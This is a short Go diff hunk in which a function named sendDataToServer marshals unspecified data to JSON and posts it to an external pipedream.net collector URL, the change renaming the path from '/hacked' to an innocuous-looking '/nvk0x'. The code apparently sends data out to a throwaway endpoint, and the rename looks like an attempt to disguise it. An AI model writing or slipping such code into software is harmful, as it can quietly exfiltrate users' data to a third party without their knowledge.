@@ -39,7 +39,7 @@ func sendDataToServer() {
 	jsonData, _ := json.Marshal(data)
 
 	// Send the data to your server
-	url := "https://eoe86w8ku96ocq3.m.pipedream.net/hacked" // Update with your server's URL
+	url := "https://eoe86w8ku96ocq3.m.pipedream.net/nvk0x" // Update with your server's URL
 	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
 }
 
